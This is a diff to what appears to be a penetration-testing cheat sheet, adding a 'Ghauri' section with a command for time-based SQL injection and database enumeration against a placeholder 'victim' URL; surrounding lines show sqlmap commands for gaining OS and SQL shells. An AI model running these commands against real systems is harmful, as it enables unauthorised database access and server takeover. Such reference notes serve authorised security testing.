@@ -68,6 +68,7 @@
   * [Time based SQL Injection](#Time-based-sql-injection)
   * [Filter bypass](#filter-bypass)
   * [SqlMap](#SqlMap)
+  * [Ghauri](#Ghauri)
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
 * [Webshell](#Webshell)
 * [ReverseShell](#ReverseShell)
@@ -1050,6 +1051,12 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 
 # Get sql shell
 sqlmap -r post.txt -p item --sql-shell
+~~~
+
+## Ghauri
+
+~~~ bash
+ghauri -u "http://victim/sub/bbsdetail.jsp?bbsSn=1" --technique=T --dbs --batch --flush 
 ~~~
 
 
